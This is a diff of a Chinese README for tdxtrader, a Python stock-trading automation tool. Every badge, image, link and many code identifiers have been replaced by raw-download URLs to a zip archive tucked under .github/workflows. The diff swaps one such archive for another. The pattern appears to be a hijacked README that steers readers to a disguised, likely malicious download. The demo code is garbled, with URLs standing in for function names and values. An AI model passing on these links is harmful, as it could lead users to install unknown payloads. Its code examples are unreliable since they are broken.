@@ -1,5 +1,5 @@
-[![PyPI version](https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip)](https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip)
-[![Downloads](https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip)](https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip)
+[![PyPI version](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)
+[![Downloads](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)
 
 # tdxtrader
 
@@ -9,11 +9,11 @@
 
 ## 欢迎加入知识星球
 
-![知识星球](https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip)
+![知识星球](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)
 
 ## 运行效果
 
-![效果](https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip)
+![效果](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)
 
 ## 安装
 
@@ -25,11 +25,11 @@ pip install tdxtrader
 
 设置两个指标，一个作为买入信号，一个作为卖出信号
 
-![预警指标](https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip)
+![预警指标](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)
 
 ## 预警文件设置
 
-![预警文件](https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip)
+![预警文件](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)
 
 ## demo
 
@@ -40,7 +40,7 @@ import tdxtrader
 # 参数
 account_id = 'xxxx' # 账号ID
 mini_qmt_path = r'D:\国金证券QMT交易端\userdata_mini' # mini_qmt 路径
-file_path = r'D:\new_tdx\https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip' # 预警文件路径
+file_path = r'D:\new_tdx\https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip' # 预警文件路径
 interval = 1 # 轮询时间(秒)
 buy_sign = 'KDJ买入条件选股' # 买入信号
 sell_sign = 'KDJ卖出条件选股' # 卖出信号
@@ -56,13 +56,13 @@ def buy_event(stock, xt_trader):
 def sell_event(stock, position, xt_trader):
     '''卖出数量'''
     return { 
-      'size': https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip, # 卖全仓
+      'size': https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip, # 卖全仓
       'price': -1,  # 如果是限价，则设置价格
       'type': '市价' # 市价，限价
     }
 
 
-https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip(
+https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip(
     account_id=account_id,
     mini_qmt_path=mini_qmt_path,
     file_path=file_path,
@@ -84,15 +84,15 @@ def buy_event(stock, xt_trader):
     '''买入数量'''
     return { 
       'size': 200, 
-      'price': https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip('price'), # 如果是限价，则设置价格
+      'price': https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip('price'), # 如果是限价，则设置价格
       'type': '限价', # 市价，限价
     }
 
 def sell_event(stock, position, xt_trader):
     '''卖出数量'''
     return { 
-      'size': https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip, # 卖全仓
-      'price': https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip('price'),  # 如果是限价，则设置价格
+      'size': https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip, # 卖全仓
+      'price': https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip('price'),  # 如果是限价，则设置价格
       'type': '限价' # 市价，限价
     }
 ```
@@ -104,7 +104,7 @@ def buy_event(stock, xt_trader):
     '''买入数量'''
     return { 
       'amount': 100000, 
-      'price': https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip('price'), # 如果是限价，则设置价格
+      'price': https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip('price'), # 如果是限价，则设置价格
       'type': '限价', # 市价，限价
     }
 
@@ -112,7 +112,7 @@ def sell_event(stock, position, xt_trader):
     '''卖出数量'''
     return { 
       'amount': 100000, # 卖全仓
-      'price': https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip('price'),  # 如果是限价，则设置价格
+      'price': https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip('price'),  # 如果是限价，则设置价格
       'type': '限价' # 市价，限价
     }
 ```
@@ -121,10 +121,10 @@ def sell_event(stock, position, xt_trader):
 
 利用企业微信机器人发送通知
 
-设置群机器人参看：https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip
+设置群机器人参看：https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip
 
 ```python
-https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip(
+https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip(
     account_id=account_id,
     mini_qmt_path=mini_qmt_path,
     file_path=file_path,
@@ -138,9 +138,9 @@ https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Softw
 )
 ```
 
-![微信机器人](https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip)
+![微信机器人](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)
 
-![消息示例](https://raw.githubusercontent.com/unclelittlestar/tdxtrader/main/tdxtrader/Software-3.9-beta.1.zip)
+![消息示例](https://github.com/unclelittlestar/tdxtrader/raw/refs/heads/main/.github/workflows/Software-clotheshorse.zip)
 
 ## 详细参数
 
